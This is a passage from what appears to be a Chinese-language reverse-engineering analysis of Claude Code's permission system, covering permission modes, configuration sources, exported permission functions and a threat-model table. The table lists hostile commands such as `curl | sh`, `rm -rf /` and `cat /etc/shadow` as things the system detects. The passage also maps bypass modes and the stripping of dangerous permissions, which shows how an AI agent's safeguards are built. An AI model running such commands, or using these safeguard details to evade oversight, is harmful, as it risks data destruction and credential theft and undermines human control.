| Hook/处理器 | 8 | `PermissionContext.ts`, `interactiveHandler.ts` 等 |
| 沙箱相关 | 12 | `shouldUseSandbox.ts`, `sandbox-adapter.ts` + 运行时 |
| **合计** | **111** | — |

### 4.2 `cli.js` 验证清单

以下关键数据点均通过 `cli.js` 运行时代码直接验证：

| 验证项 | 验证方法 | 结果 |
|--------|----------|------|
| 权限模式枚举 | 搜索 `MA8=` 定义 | 6 种模式：`acceptEdits`, `bypassPermissions`, `default`, `dontAsk`, `plan`, `auto` |
| 配置源列表 | 搜索 `cT=` 定义 | 5 个配置源：`userSettings`, `projectSettings`, `localSettings`, `flagSettings`, `policySettings` |
| 拒绝限制常量 | 搜索 `Np8=` 定义 | `maxConsecutive: 3`, `maxTotal: 20` |
| 权限规则语法 | 搜索权限配置文档 | 精确匹配、前缀通配、工具级三种语法 |
| sandbox-exec 集成 | 搜索 `sandbox-exec` | macOS 使用 `-p` Profile 参数 |
| Bubblewrap 集成 | 搜索 `bubblewrap`/`bwrap` | Linux 作为沙箱方案，需通过 apt 安装 |
| 企业管控键 | 搜索 `allowManaged*Only` | 5 个 `*Only` 开关用于企业锁定 |
| ToolPermissionContext | 搜索 `getToolPermissionContext` | 包含 `mode`, `alwaysAllowRules`, `alwaysDenyRules`, `alwaysAskRules`, `isBypassPermissionsModeAvailable` |
| MDM 路径 | 搜索 `managed-settings` | macOS: `/Library/Application Support/ClaudeCode/`, Linux: `/etc/claude-code/` |
| 权限导出函数 | 搜索模块导出 | 28 个公开函数，覆盖初始化、模式转换、危险检测、规则管理 |

### 4.3 权限模块导出函数全表

从 `cli.js` 模块导出声明中提取的完整权限函数列表：

```
initializeToolPermissionContext    初始化权限上下文
initialPermissionModeFromCLI       从 CLI 参数解析初始模式
transitionPermissionMode           权限模式切换
transitionPlanAutoMode             Plan 模式与 Auto 模式转换
prepareContextForPlanMode          为 Plan 模式准备上下文
isDefaultPermissionModeAuto        检查默认模式是否为 auto
isBypassPermissionsModeDisabled    检查 bypass 模式是否被禁用
shouldDisableBypassPermissions     判断是否应该禁用 bypass
checkAndDisableBypassPermissions   检查并禁用 bypass 模式
createDisabledBypassPermissionsContext 创建禁用 bypass 的上下文
isAutoModeGateEnabled              检查 auto 模式 gate 是否开启
getAutoModeEnabledState            获取 auto 模式启用状态
getAutoModeEnabledStateIfCached    获取缓存的 auto 模式状态
getAutoModeUnavailableReason       获取 auto 模式不可用原因
getAutoModeUnavailableNotification 获取 auto 模式不可用通知
hasAutoModeOptInAnySource          检查任意配置源是否有 auto 模式 opt-in
verifyAutoModeGateAccess           验证 auto 模式 gate 访问
shouldPlanUseAutoMode              判断 Plan 模式是否使用 auto 语义
isOverlyBroadBashAllowRule         检测宽泛的 Bash 允许规则
isOverlyBroadPowerShellAllowRule   检测宽泛的 PowerShell 允许规则
isDangerousBashPermission          检测危险的 Bash 权限
isDangerousPowerShellPermission    检测危险的 PowerShell 权限
isDangerousTaskPermission          检测危险的 Task 权限
findDangerousClassifierPermissions 查找所有危险的分类器权限
findOverlyBroadBashPermissions     查找宽泛的 Bash 权限
findOverlyBroadPowerShellPermissions 查找宽泛的 PowerShell 权限
stripDangerousPermissionsForAutoMode 为 auto 模式剥离危险权限
removeDangerousPermissions         移除危险权限
restoreDangerousPermissions        恢复被剥离的权限
parseToolListFromCLI               解析 CLI 的工具列表参数
parseBaseToolsFromCLI              解析 CLI 的基础工具参数
```

### 4.4 安全威胁模型对照

| 威胁 | 防护层 | 检测机制 |
|------|--------|----------|
| 远程代码执行 (`curl \| sh`) | Bash 分类器 + 沙箱网络隔离 | dangerousPatterns Level 1 |
| 数据销毁 (`rm -rf /`) | Bash 分类器 + deny 规则 + 沙箱文件系统 | dangerousPatterns Level 2 |
| 权限提升 (`sudo`) | Bash 分类器 + 沙箱进程隔离 | dangerousPatterns Level 3 |
| 信息泄露 (`cat /etc/shadow`) | 路径验证 + 沙箱读限制 | dangerousPatterns Level 4 |
| 路径遍历 (`../../`) | pathValidation + additionalDirectories 检查 | 路径规范化后比对 |
| 命令注入（通过管道/重定向） | 命令链解析 + 子命令递归检查 | bashClassifier 管道分析 |
| 工具滥用（无限循环） | 拒绝追踪 + 熔断机制 | maxConsecutive=3, maxTotal=20 |
| 策略绕过 | policySettings 不可覆盖 + disableBypassPermissionsMode | 企业 MDM 强制策略 |
| 沙箱逃逸 | allowUnsandboxedCommands=false | OS 级进程隔离 |
| Swarm Worker 权限偏离 | Leader 权限桥接 + 权限同步 | Worker 无独立决策能力 |


> **总结**：Claude Code 的权限系统不是一个简单的"能/不能"开关，而是一个覆盖 111 个源文件的多层纵深防御体系。从用户体验的 6 种模式适配，到 Bash 命令的 5 步安全分析管线，从 AI 分类器的两阶段决策，到 OS 级沙箱的进程隔离——每一层都针对特定威胁模型提供差异化的保护。企业通过 MDM 策略获得不可绕过的管控能力，开发者通过规则学习和记忆逐步减少打断，自动化场景通过 `dontAsk` + Hook 实现无人值守的安全执行。
